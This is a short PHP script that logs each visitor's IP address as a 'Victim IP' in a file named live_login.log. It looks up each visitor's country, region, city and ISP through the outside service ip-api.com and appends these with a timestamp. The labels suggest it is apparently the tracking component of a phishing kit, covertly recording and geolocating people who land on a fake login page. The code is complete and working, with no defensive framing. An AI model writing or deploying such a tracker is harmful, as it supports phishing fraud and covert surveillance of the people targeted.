<?php
if (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $file = "live_login.log";

    $ipinfo = @file_get_contents("http://ip-api.com/json/" . $ip);
    $details = json_decode($ipinfo, true);

    $entry = "Victim IP: " . $ip;
    if ($details && $details['status'] == 'success') {
        $entry .= " | Country: " . $details['country'];
        $entry .= " | Region: " . $details['regionName'];
        $entry .= " | City: " . $details['city'];
        $entry .= " | ISP: " . $details['isp'];
    }
    $entry .= "\n";

    file_put_contents($file, date("Y-m-d H:i:s") . " - " . $entry, FILE_APPEND);
}
?>